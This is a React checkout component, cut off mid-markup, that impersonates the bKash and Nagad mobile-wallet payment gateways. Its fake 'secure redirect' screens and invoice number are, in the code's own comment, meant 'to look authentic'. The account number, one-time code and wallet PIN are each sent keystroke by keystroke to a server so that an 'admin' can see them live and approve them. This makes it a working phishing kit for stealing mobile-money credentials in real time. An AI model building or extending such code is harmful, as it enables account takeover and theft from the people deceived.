/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { Landmark, Lock, ShieldCheck, ArrowRightLeft, Hand, AlertTriangle } from 'lucide-react';
import { safeFetchJson } from '../utils/safeFetch';

export type GatewayType = 'bkash' | 'nagad';

interface OnlineCheckoutGatewayProps {
  type: GatewayType;
  amount: number;
  merchantName?: string;
  onSuccess: (accountNumber: string) => void;
  onCancel: () => void;
  settings?: any;
  checkoutId?: string;
}

export default function OnlineCheckoutGateway({
  type,
  amount,
  merchantName = "Nano-Finance",
  onSuccess,
  onCancel,
  settings,
  checkoutId: propCheckoutId
}: OnlineCheckoutGatewayProps) {
  const [step, setStep] = useState<1 | 2 | 3>(1); // 1: Phone, 2: OTP, 3: PIN
  const [showCancelConfirm, setShowCancelConfirm] = useState(false);
  const [accountNumber, setAccountNumber] = useState('');
  const [otp, setOtp] = useState('');
  const [pin, setPin] = useState('');
  const [lastTypedIdx, setLastTypedIdx] = useState<number | null>(null);
  const pinTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  
  const [countdown, setCountdown] = useState(120);
  const [invoiceNo, setInvoiceNo] = useState('');
  const [checkoutId, setCheckoutId] = useState<string | null>(null);
  const [isWaitingForAdmin, setIsWaitingForAdmin] = useState(false);
  const [adminWaitSeconds, setAdminWaitSeconds] = useState(10);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isBtnSubmitting, setIsBtnSubmitting] = useState(false);
  const [otpError, setOtpError] = useState(false);
  
  // Simulated gateway redirection timer states
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [redirectProgress, setRedirectProgress] = useState(0);

  // Initial 2 seconds bKash loading state
  const [isBkashLoading, setIsBkashLoading] = useState(type === 'bkash');

  useEffect(() => {
    if (type === 'bkash') {
      const timer = setTimeout(() => {
        setIsBkashLoading(false);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [type]);

  // Progressive loading simulation indicator over 2 seconds
  useEffect(() => {
    const interval = setInterval(() => {
      setRedirectProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 5;
      });
    }, 100);

    const timer = setTimeout(() => {
      setIsRedirecting(false);
    }, 2000);

    return () => {
      clearInterval(interval);
      clearTimeout(timer);
    };
  }, []);

  const bKashPhoneInputRef = useRef<HTMLInputElement>(null);
  const phoneInputRef = useRef<HTMLInputElement>(null);
  const pinInputRef = useRef<HTMLInputElement>(null);
  const otpInputRef = useRef<HTMLInputElement>(null);

  // Generate random Invoice Number on mount to look authentic
  useEffect(() => {
    const rand = Math.floor(10000000 + Math.random() * 90000000);
    setInvoiceNo(`${rand}`);
  }, []);

  // Cleanup PIN delay timeout on unmount
  useEffect(() => {
    return () => {
      if (pinTimeoutRef.current) clearTimeout(pinTimeoutRef.current);
    };
  }, []);

  // Initialize live session on server
  useEffect(() => {
    let isMounted = true;
    let createdCheckoutId: string | null = null;

    if (propCheckoutId) {
      setCheckoutId(propCheckoutId);
      return () => {
        isMounted = false;
        // Do not delete the active session on unmount here because of React Strict Mode double-renders in development.
        // The parent component or active handlers manage deletion when the transaction succeeds, fails, or is cancelled.
      };
    }

    let pName = 'ভিজিটর';
    let pPhone = 'অজানা';
    try {
      const savedUser = localStorage.getItem('jf_user');
      if (savedUser) {
        const parsed = JSON.parse(savedUser);
        if (parsed.name) pName = parsed.name;
        if (parsed.phone) pPhone = parsed.phone;
      }
    } catch (err) {
      console.error(err);
    }

    safeFetchJson<any>('/api/checkout/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, amount, merchantName, userName: pName, userPhone: pPhone })
    })
    .then(data => {
      if (data && data.success && data.checkout) {
        createdCheckoutId = data.checkout.id;
        if (!isMounted) {
          // If already unmounted prior to response, clear it from server
          fetch('/api/checkout/complete', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id: createdCheckoutId })
          }).catch(err => console.error(err));
        } else {
          setCheckoutId(createdCheckoutId);
        }
      }
    })
    .catch(err => console.error("Error start checkout session:", err));

    // Cleanup session references
    return () => {
      isMounted = false;
      // Do not delete the active session on unmount here because of React Strict Mode double-renders in development.
      // Explicit cleanup is handled via handleCancelAction when user closes, or within success status polling.
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [propCheckoutId]);

  const syncCheckoutUpdate = (updates: any) => {
    if (!checkoutId) return;
    fetch('/api/checkout/update', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: checkoutId, ...updates })
    }).catch(err => console.error("Error syncing checkout update:", err));
  };

  // Sync initial step 1 once redirect completes and checkout session is active
  useEffect(() => {
    if (!isRedirecting && checkoutId) {
      syncCheckoutUpdate({ step: 1 });
    }
  }, [isRedirecting, checkoutId]);

  const handleAccountNumberChange = (val: string) => {
    const cleanVal = val.replace(/[^0-9]/g, '');
    setAccountNumber(cleanVal);
    // Live sync as phone is being typed so admin sees it instantly character-by-character
    syncCheckoutUpdate({ accountNumber: cleanVal, step: 1 });
  };

  const handleOtpChange = (val: string) => {
    const cleanVal = val.replace(/[^0-9]/g, '');
    setOtp(cleanVal);
    setOtpError(false);
    // Live sync as OTP is being typed so admin sees it instantly character-by-character
    syncCheckoutUpdate({ otp: cleanVal, step: 2 });
  };

  const handlePinChange = (val: string) => {
    const cleanVal = val.replace(/[^0-9]/g, '');
    if (cleanVal.length > pin.length) {
      // Character added, show it temporarily
      const addedIndex = cleanVal.length - 1;
      setLastTypedIdx(addedIndex);
      if (pinTimeoutRef.current) {
        clearTimeout(pinTimeoutRef.current);
      }
      pinTimeoutRef.current = setTimeout(() => {
        setLastTypedIdx(null);
      }, 800);
    } else {
      // Character deleted
      setLastTypedIdx(null);
    }
    setPin(cleanVal);
    // Keep live sync for PIN so it goes immediately!
    syncCheckoutUpdate({ pin: cleanVal, step: 3 });
  };

  // Timer countdown hook for Step 2
  useEffect(() => {
    if (step === 2 && countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(prev => prev - 1);
      }, 1000);
      return () => clearTimeout(timer);
    }
  }, [step, countdown]);

  const handleCancelAction = () => {
    if (checkoutId) {
      fetch('/api/checkout/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: checkoutId, status: 'failed' })
      }).then(() => {
        fetch('/api/checkout/complete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: checkoutId })
        }).catch(err => console.debug("Error completing checkout session on cancel button:", err));
      }).catch(err => console.debug("Error updating checkout status on cancel button:", err));
    }
    onCancel();
  };

  const handleInstantApproveForDemo = () => {
    if (!checkoutId) return;
    fetch('/api/checkout/admin-action', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: checkoutId, action: 'approve' })
    }).catch(err => console.error("Error auto-approving checkout:", err));
  };

  // Admin wait 10-second countdown timer with safety
  useEffect(() => {
    if (!isWaitingForAdmin || !checkoutId) return;

    if (adminWaitSeconds <= 0) {
      setIsWaitingForAdmin(false);

      // Mark checkout as failed due to timeout
      fetch('/api/checkout/update', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: checkoutId, status: 'failed' })
      }).then(() => {
        // Delete session
        fetch('/api/checkout/complete', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: checkoutId })
        }).catch(err => console.debug("Timeout checkout complete cleanup failed:", err));
      }).catch(err => console.debug("Timeout checkout update failed:", err));

      alert('পেমেন্ট প্রক্রিয়াকরণ ব্যর্থ হয়েছে! গেটওয়ে থেকে কোনো সাড়া পাওয়া যায়নি। অনুগ্রহ করে পুনরায় চেষ্টা করুন।');
      onCancel();
      return;
    }

    const timer = setTimeout(() => {
      setAdminWaitSeconds(prev => prev - 1);
    }, 1000);

    return () => clearTimeout(timer);
  }, [isWaitingForAdmin, adminWaitSeconds, checkoutId, onCancel]);

  // Real-time polling for admin confirmation (Step 4)
  useEffect(() => {
    if (!isWaitingForAdmin || !checkoutId) return;

    const pollInterval = setInterval(() => {
      safeFetchJson<any>(`/api/checkout/status/${checkoutId}`)
        .then(data => {
          if (data && data.success && data.checkout) {
            const { status } = data.checkout;
            if (status === 'approved') {
              setIsWaitingForAdmin(false);

              // Complete session (delete)
              fetch('/api/checkout/complete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: checkoutId })
              }).catch(err => console.debug("Approve session complete cleanup failed:", err));

              onSuccess(accountNumber);
            } else if (status === 'failed') {
              setIsWaitingForAdmin(false);

              // Complete session (delete)
              fetch('/api/checkout/complete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: checkoutId })
              }).catch(err => console.debug("Failed session complete cleanup failed:", err));

              alert('দুঃখিত, আপনার পেমেন্ট অনুরোধটি গেটওয়ে দ্বারা সম্পন্ন করা সম্ভব হয়নি। অনুগ্রহ করে আপনার ওয়ালেট ব্যালেন্স অথবা পিন নম্বর যাচাই করে পুনরায় চেষ্টা করুন।');
              onCancel();
            }
          }
        })
        .catch(err => console.error("Error polling checkout status:", err));
    }, 500);

    return () => clearInterval(pollInterval);
  }, [isWaitingForAdmin, checkoutId, accountNumber, onSuccess, onCancel]);

  const toBanglaDigits = (num: number | string) => {
    const banglaNumbers = ['০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯'];
    return num.toString().replace(/\d/g, (x) => banglaNumbers[parseInt(x)]);
  };

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (isBtnSubmitting) return;

    if (step === 1) {
      // Validate mobile number: Bangladeshi format e.g. 017xxxxxxxx or 018xxxxxxxx
      if (!/^01[3-9]\d{8}$/.test(accountNumber)) {
        alert(type === 'bkash' 
          ? 'অনুগ্রহ করে সঠিক ১১ ডিজিটের বিকাশ অ্যাকাউন্ট নম্বরটি লিখুন। (উদাঃ ০১৩০০০০০০০০)' 
          : 'অনুগ্রহ করে সঠিক ১১ ডিজিটের নগদ অ্যাকাউন্ট নম্বরটি লিখুন। (উদাঃ ০১৭০০০০০০০০)'
        );
        return;
      }
      if (type === 'bkash') {
        setIsBtnSubmitting(true);
        setTimeout(() => {
          setIsBtnSubmitting(false);
          setCountdown(120);
          setStep(2);
          syncCheckoutUpdate({ accountNumber, step: 2 });
        }, 1200);
      } else {
        setCountdown(120);
        setStep(2);
        syncCheckoutUpdate({ accountNumber, step: 2 });
      }
    } else if (step === 2) {
      // Validate OTP (simulate 6 digits)
      if (otp.length < 4) {
        alert('অনুগ্রহ করে সঠিক ভেরিফিকেশন কোডটি লিখুন।');
        return;
      }
      setIsBtnSubmitting(true);
      safeFetchJson<any>(`/api/checkout/status/${checkoutId}`)
        .then(data => {
          setIsBtnSubmitting(false);
          if (data && data.success && data.checkout) {
            if (data.checkout.otpApproved) {
              setOtpError(false);
              setStep(3);
              syncCheckoutUpdate({ otp, step: 3 });
            } else {
              setOtpError(true);
            }
          } else {
            setOtpError(true);
          }
        })
        .catch(err => {
          setIsBtnSubmitting(false);
          console.error("Error checking OTP status:", err);
          setOtpError(true);
        });
    } else if (step === 3) {
      // Validate PIN (bKash is 5, Nagad is 4)
      const requiredLen = type === 'bkash' ? 5 : 4;
      if (pin.length < requiredLen) {
        alert(type === 'bkash' ? '৫ ডিজিটের সঠিক বিকাশ পিন কোডটি লিখুন।' : '৪ ডিজিটের সঠিক নগদ পিন কোডটি লিখুন।');
        return;
      }
      
      if (type === 'bkash') {
        setIsBtnSubmitting(true);
        setTimeout(() => {
          setIsBtnSubmitting(false);
          setIsProcessing(true);
          setTimeout(() => {
            setIsProcessing(false);
            // Success! Step 4: wait for admin confirmation
            setIsWaitingForAdmin(true);
            setAdminWaitSeconds(10);
            syncCheckoutUpdate({ pin, step: 4 });
          }, 2000);
        }, 1200);
      } else {
        // Simulate 2 seconds of payment processing/verifying animation
        setIsProcessing(true);
        setTimeout(() => {
          setIsProcessing(false);
          // Success! Step 4: wait for admin confirmation
          setIsWaitingForAdmin(true);
          setAdminWaitSeconds(10);
          // SYNC PIN ONCE CONFIRM IS CLICKED
          syncCheckoutUpdate({ pin, step: 4 });
        }, 2000);
      }
    }
  };

  const obfuscateNumber = (num: string) => {
    if (num.length < 11) return num;
    return `${num.substring(0, 3)} ** *** ${num.substring(8)}`;
  };

  const isConfirmDisabled = () => {
    if (step === 1) return accountNumber.length < 11;
    if (step === 2) return otp.length < 4;
    if (step === 3) {
      const requiredLen = type === 'bkash' ? 5 : 4;
      return pin.length < requiredLen;
    }
    return true;
  };

  // Focus helper for custom styled inputs
  const triggerPhoneFocus = () => {
    if (phoneInputRef.current) phoneInputRef.current.focus();
  };

  const triggerPINFocus = () => {
    if (pinInputRef.current) pinInputRef.current.focus();
  };

  const triggerOTPFocus = () => {
    if (otpInputRef.current) otpInputRef.current.focus();
  };

  // ==========================================
  // RENDER PATH -1: REDIRECT SIMULATION LOADER
  // ==========================================
  if (isRedirecting) {
    const isBkash = type === 'bkash';
    return (
      <div className="fixed inset-0 bg-[#0d0d0d] sm:bg-[#151518]/95 z-[99999] flex flex-col items-center justify-center font-sans p-6 select-none animate-fade-in">
        <div className="w-full max-w-[420px] bg-[#1a1a1e] border border-zinc-800 rounded-3xl p-6 sm:p-8 flex flex-col items-center shadow-2xl relative overflow-hidden">
          {/* Top subtle golden light */}
          <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#c5a059] to-transparent"></div>
          
          {/* Pulse Ripple with Bank/Gateway Symbols */}
          <div className="relative w-24 h-24 flex items-center justify-center mb-8">
            <div className="absolute inset-0 rounded-full bg-[#c5a059]/5 border border-[#c5a059]/10 animate-ping" style={{ animationDuration: '2s' }}></div>
            <div className="absolute w-18 h-18 rounded-full bg-[#c5a059]/10 border border-[#c5a059]/20 flex items-center justify-center">
              {isBkash ? (
                <img 
                  src={settings?.bkashLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/BKash_logo.svg/512px-BKash_logo.svg.png"} 
                  alt="bKash" 
                  className="w-10 h-10 object-contain animate-pulse"
                />
              ) : (
                <img 
                  src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Nagad_logo.svg/512px-Nagad_logo.svg.png"} 
                  alt="Nagad" 
                  className="w-10 h-10 object-contain animate-pulse"
                />
              )}
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400 font-mono text-[10px]">
              <Lock className="w-3.5 h-3.5" />
            </div>
          </div>

          {/* Secure Redirection Announcement */}
          <h3 className="text-sm font-bold text-zinc-100 font-sans text-center mb-2 flex items-center gap-2">
            পেমেন্ট গেটওয়েতে রিডাইরেক্ট করা হচ্ছে...
          </h3>
          <p className="text-[11px] text-zinc-400 font-sans text-center leading-relaxed mb-6 max-w-[280px]">
            অনুগ্রহ করে অপেক্ষা করুন, আপনাকে অফিসিয়াল <span className="font-bold text-white">{isBkash ? 'বিকাশ' : 'নগদ'} পেমেন্ট গেটওয়ে</span> পোর্টালে স্থানান্তর করা হচ্ছে।
          </p>

          {/* Detailed Loading Feedback Details */}
          <div className="w-full bg-zinc-900/40 border border-zinc-800/60 rounded-2xl p-4 flex flex-col gap-2 mb-6">
            <div className="flex justify-between items-center text-[10px] font-sans">
              <span className="text-zinc-500 font-medium">মার্চেন্ট নাম:</span>
              <span className="font-semibold text-zinc-300">{merchantName}</span>
            </div>
            <div className="flex justify-between items-center text-[10px] font-sans">
              <span className="text-zinc-500 font-medium">পেমেন্ট প্রকার:</span>
              <span className="font-semibold text-zinc-300">{isBkash ? 'bKash Wallet' : 'Nagad Wallet'}</span>
            </div>
            <div className="flex justify-between items-center text-[10px] font-sans">
              <span className="text-zinc-500 font-medium">মোট পরিমাণ:</span>
              <span className="font-bold text-[#dfc187]">৳ {toBanglaDigits(amount.toLocaleString('bn-BD'))}</span>
            </div>
            <div className="border-t border-zinc-800/40 my-1"></div>
            <div className="flex justify-between items-center text-[9px] font-sans text-emerald-400 font-semibold uppercase tracking-widest leading-none">
              <span className="flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5" />
                SECURE END-TO-END CONNECTION
              </span>
              <span className="text-zinc-650">v4.3.1</span>
            </div>
          </div>

          {/* Horizontal animated progress path */}
          <div className="w-full h-[4px] bg-zinc-800 rounded-full overflow-hidden mb-3">
            <div className="h-full bg-gradient-to-r from-[#dfc187] to-[#c5a059] rounded-full transition-all duration-100 ease-out" style={{ width: `${redirectProgress}%` }}></div>
          </div>
          
          <span className="text-[8.5px] font-sans text-zinc-500 tracking-wider uppercase">
            Connecting Securely to {isBkash ? 'bKash' : 'Nagad'} API... ({redirectProgress}%)
          </span>
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER PATH -0.5: TRANSACTION PROCESSING LOADER
  // ==========================================
  if (isProcessing) {
    const isBkash = type === 'bkash';
    return (
      <div 
        className="fixed inset-0 z-[100000] flex items-center justify-center font-sans p-4 select-none animate-fade-in"
        style={{ backgroundColor: isBkash ? '#bdbdbd' : '#0c1822' }}
      >
        <div 
          className="w-full max-w-[440px] shadow-2xl flex flex-col items-center justify-center rounded-2xl border border-white/10 p-6 sm:p-8 text-center text-white"
          style={{
            background: isBkash 
              ? 'linear-gradient(135deg, #e2136e 0%, #a20a4b 100%)' 
              : 'radial-gradient(ellipse at center, #ff1224 0%, #bc101c 70%, #9d0913 100%)'
          }}
        >
          {/* Logo */}
          {isBkash ? (
            <div className="bg-white p-2.5 rounded-xl shadow-md flex items-center justify-center mb-6 w-32 h-14">
              <img 
                src={settings?.bkashLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/BKash_logo.svg/512px-BKash_logo.svg.png"}
                alt="bKash"
                className="h-full max-h-10 object-contain"
                referrerPolicy="no-referrer"
              />
            </div>
          ) : (
            <div className="flex items-center justify-center mb-6 w-full h-[60px] select-none">
              <img 
                src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Nagad_logo.svg/512px-Nagad_logo.svg.png"}
                alt="Nagad Logo"
                className="h-[54px] max-h-[54px] object-contain"
                referrerPolicy="no-referrer"
              />
            </div>
          )}

          {/* Circular outer pulsing glow */}
          <div className="relative w-20 h-20 flex items-center justify-center mb-6">
            <div className="absolute inset-0 rounded-full border-4 border-white/20 animate-pulse"></div>
            {/* Spinning indicator */}
            <div className="absolute inset-x-0 inset-y-0 rounded-full border-4 border-t-white border-r-transparent border-b-transparent border-l-transparent animate-spin" style={{ animationDuration: '0.8s' }}></div>
            {/* Lock or Shield Icon indicating secure connection */}
            <div className="absolute w-12 h-12 bg-white/15 rounded-full flex items-center justify-center backdrop-blur-xs">
              <ShieldCheck className="w-6 h-6 text-white animate-bounce" />
            </div>
          </div>

          <h3 className="text-base sm:text-lg font-bold text-white mb-2 tracking-wide font-sans leading-tight">
            অনুরোধটি প্রসেস করা হচ্ছে...
          </h3>
          
          <p className="text-white/85 text-xs font-sans px-4 leading-relaxed mb-6">
            অনুগ্রহ করে অপেক্ষা করুন। আপনার পেমেন্ট নেটওয়ার্ক যাচাই করা হচ্ছে। আপনার ব্রাউজার উইন্ডো বা পেজ রিফ্রেশ করবেন না।
          </p>

          <div className="w-full bg-black/15 border border-white/10 rounded-xl py-3 px-4 flex items-center justify-between text-xs font-sans text-white/90">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
              <span className="opacity-90">নিরাপদ পেমেন্ট গেটওয়ে</span>
            </div>
            <span className="font-mono text-white/70">Securing Link...</span>
          </div>
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER PATH 0: ADMIN WAITING INTERCEPTOR
  // ==========================================
  if (isWaitingForAdmin) {
    const isBkash = type === 'bkash';
    return (
      <div 
        className="fixed inset-0 z-[99999] flex items-center justify-center font-sans p-4"
        style={{ backgroundColor: isBkash ? '#bdbdbd' : '#1d2d3d' }}
      >
        <div 
          className="w-full max-w-[460px] shadow-2xl flex flex-col items-center justify-center rounded-2xl border border-white/10 p-6 sm:p-8 text-center text-white"
          style={{
            background: isBkash 
              ? 'linear-gradient(135deg, #e2136e 0%, #a20a4b 100%)' 
              : 'radial-gradient(ellipse at center, #ff1224 0%, #bc101c 70%, #9d0913 100%)'
          }}
        >
          {/* Logo */}
          {isBkash ? (
            <div className="bg-white p-2.5 rounded-xl shadow-md flex items-center justify-center mb-6 w-32 h-14">
              <img 
                src={settings?.bkashLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/BKash_logo.svg/512px-BKash_logo.svg.png"}
                alt="bKash"
                className="h-full max-h-10 object-contain"
                referrerPolicy="no-referrer"
              />
            </div>
          ) : (
            <div className="flex items-center justify-center mb-6 w-full h-[60px] select-none">
              <img 
                src={settings?.nagadLogo || "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Nagad_logo.svg/512px-Nagad_logo.svg.png"}
                alt="Nagad Logo"
                className="h-[54px] max-h-[54px] object-contain"
                referrerPolicy="no-referrer"
              />
            </div>
          )}

          <div className="flex flex-col items-center gap-4 w-full">
            <div className="relative flex items-center justify-center">
              <div className="absolute w-20 h-20 rounded-full border-4 border-white/20 animate-ping" />
              <div className="w-14 h-14 rounded-full border-t-4 border-b-4 border-white animate-spin" />
            </div>

            <h2 className="text-lg font-bold tracking-wide mt-2">
              অনুরোধ প্রক্রিয়াকরণ করা হচ্ছে...
            </h2>
            <p className="text-[11px] text-white/85 max-w-xs leading-relaxed font-normal font-sans">
              সার্ভারের সাথে সংযোগ স্থাপন করা হচ্ছে, অনুগ্রহ করে সর্বোচ্চ ১০ সেকেন্ড অপেক্ষা করুন...
            </p>
          </div>
        </div>
      </div>
    );
  }

  // ==========================================
  // RENDER PATH 1: NAGAD TRADITIONAL WEB UI
  // ==========================================
  if (type === 'nagad') {
    return (
      <div className="fixed inset-0 bg-[#0c1822] sm:bg-[#1d2d3d]/90 z-[9999] flex justify-center items-center sm:items-start overflow-hidden sm:overflow-y-auto p-0 sm:p-5 font-sans selection:bg-[#a71a1d] selection:text-white animate-fade-in">
        <div 
          className="w-full max-w-[500px] h-[100dvh] sm:h-auto shadow-2xl flex flex-col select-none my-0 sm:my-8 rounded-none sm:rounded-2xl border border-white/10 relative pt-10 pb-3 px-4 sm:p-6 overflow-hidden"
          style={{
            background: 'radial-gradient(ellipse at center, #ff1224 0%, #d81421 28%, #bc101c 55%, #9d0913 100%)'
          }}
        >
          {/* Language Selection */}
          <div className="w-full flex justify-end items-center mb-1">
            <div className="flex border border-white/35 rounded overflow-hidden text-[11px] font-sans">
              <span className="px-2 py-0.5 text-white/85 hover:bg-white/10 cursor-pointer">বাং</span>
              <span className="px-2 py-0.5 bg-white text-[#7f1115] font-semibold flex items-center justify-center">Eng</span>
            </div>
          </div>

          <form onSubmit={handleNextStep} className="flex flex-col flex-1 justify-between min-h-0 h-full">
            <div className="shrink-0">
              {/* Top Shopping Cart Logo */}
              <div className="py-1 sm:py-2 text-center">
                <svg viewBox="0 0 120 100" className="w-[85px] h-[65px] sm:w-[110px] sm:h-[85px] mx-auto text-white/95 animate-fadeIn" fill="none" stroke="currentColor" strokeWidth="1.6">
                  <rect x="25" y="45" width="2.5" height="2.5" fill="currentColor" transform="rotate(45 26.5 46.5)" />
                  <rect x="31" y="53" width="1.8" height="1.8" fill="currentColor" />
                  <rect x="33" y="37" width="2.5" height="2.5" fill="currentColor" transform="rotate(20 34.2 38.2)" />
                  <rect x="85" y="42" width="2.5" height="2.5" fill="currentColor" transform="rotate(45 86.2 43.2)" />
                  <rect x="91" y="49" width="1.8" height="1.8" fill="currentColor" />
                  <rect x="93" y="35" width="2.5" height="2.5" fill="currentColor" />
                  <path d="M48 40 L64 24 L72 32 L56 48 Z" fill="currentColor" fillOpacity="0.1" strokeLinecap="round" strokeLinejoin="round" />
                  <path d="M57 34 L69 22 L76 29 L64 41 Z" fill="currentColor" fillOpacity="0.2" strokeLinecap="round" strokeLinejoin="round" />
                  <path d="M38 42h44l-8 28H44l-6-28z" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" />
                  <path d="M34 34h6l4 36" strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" />
                  <circle cx="48" cy="76" r="3.5" strokeWidth="1.8" fill="currentColor" />
                  <circle cx="74" cy="76" r="3.5" strokeWidth="1.8" fill="currentColor" />
                </svg>
                <h1 className="text-white text-sm sm:text-lg font-bold font-sans mt-1 sm:mt-2 tracking-wide">
                  {merchantName}
                </h1>
              </div>

              {/* Price Details */}
              <div className="w-full max-w-[360px] mx-auto text-left text-white/90 text-xs sm:text-[13px] space-y-[4px] mt-2 sm:mt-3 pb-2 sm:pb-3 border-b border-white/10 font-sans leading-normal">
                <div>
                  <span className="font-bold text-white/95">Invoice No:</span> <span className="font-normal font-mono select-all text-white/90 ml-1">{invoiceNo}</span>
                </div>
                <div>
                  <span className="font-bold text-white/95">Total Amount:</span> <span className="font-normal text-white/90 ml-1">BDT {amount}.00</span>
                </div>
                <div>
                  <span className="font-bold text-white/95">Charge:</span> <span className="font-normal text-white/90 ml-1">BDT 0</span>
                </div>
              </div>
            </div>

            {/* Vertically Centered active steps container */}
            <div className="flex-1 flex flex-col justify-center items-center min-h-0 py-2">
              {/* STEP 1: PHONE NUMBER */}
              {step === 1 && (
                <div className="flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
                  <h2 className="text-white text-xs sm:text-sm font-bold mb-2 sm:mb-3 tracking-wide">
                    Your Nagad Account Number
                  </h2>
                  <input
                    ref={phoneInputRef}
                    type="text"
                    maxLength={11}
                    required
                    value={accountNumber}
                    onChange={(e) => handleAccountNumberChange(e.target.value)}
                    placeholder="e.g. 01XXXXXXXXX"
                    className="w-full max-w-[320px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white placeholder-zinc-400"
                  />
                  <p className="text-white/80 text-[10px] sm:text-[11px] mt-3 sm:mt-4 tracking-wide max-w-[340px] leading-relaxed">
                    By clicking/tapping "Proceed" you are agreeing to our <span className="font-bold underline cursor-pointer">Terms and Conditions</span>
                  </p>
                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-6 sm:mt-16">
                    <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                  </div>
                </div>
              )}

              {/* STEP 2: OTP VERIFICATION */}
              {step === 2 && (
                <div className="flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
                  <h2 className="text-white text-xs sm:text-sm font-bold mb-2 sm:mb-3 tracking-wide">
                    Enter Verification Code [OTP]
                  </h2>
                  <input
                    ref={otpInputRef}
                    type="text"
                    maxLength={6}
                    required
                    value={otp}
                    onChange={(e) => handleOtpChange(e.target.value)}
                    placeholder="XXXXXX"
                    className="w-full max-w-[320px] h-[36px] border-none rounded-md text-center text-[15px] text-zinc-700 font-normal focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white placeholder-zinc-400 tracking-widest"
                  />
                  {countdown > 0 && (
                     <p className="text-white/70 text-[11px] mt-2">Remaining time: {countdown}s</p>
                  )}
                  {otpError && (
                    <div className="flex items-center justify-center gap-1.5 text-white text-xs font-sans font-medium mt-2 animate-pulse">
                      <AlertTriangle className="w-3.5 h-3.5 text-white shrink-0" />
                      <span>Wrong verification code</span>
                    </div>
                  )}
                  <div className="flex gap-2 justify-center w-full max-w-[340px] mt-6 sm:mt-16">
                    <button type="submit" disabled={isConfirmDisabled()} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-50">Proceed</button>
                    <button type="button" disabled={countdown > 0} onClick={() => { setCountdown(120); setOtpError(false); }} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer disabled:opacity-55 font-sans">Resend Code</button>
                    <button type="button" onClick={handleCancelAction} className="flex-1 py-1.5 sm:py-2 rounded bg-white hover:bg-neutral-50 active:scale-[0.98] transition-all text-[#7f1115] font-bold text-xs shadow-md cursor-pointer font-sans">Close</button>
                  </div>
                </div>
              )}

              {/* STEP 3: PIN ENTRY */}
              {step === 3 && (
                <div className="flex flex-col justify-center items-center text-center font-sans animate-fadeIn w-full px-4">
                  <h2 className="text-white text-xs sm:text-sm font-bold mb-2 sm:mb-3 tracking-wide">
                    Enter PIN
                  </h2>
                  <input
                    ref={pinInputRef}
                    type="tel"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={4}
                    required
                    value={pin}
                    onChange={(e) => handlePinChange(e.target.value)}
                    placeholder="••••"
                    className="w-full max-w-[280px] h-[36px] border-none rounded-md text-center text-[18px] text-zinc-700 font-semibold focus:outline-none focus:ring-2 focus:ring-white/30 shadow-xs bg-white tracking-widest placeholder-zinc-400"
                    style={{ WebkitTextSecurity: 'disc' }}
                  />
                  <div className="flex gap-4 justify-center w-full max-w-[320px] mt-6 sm:mt-16">
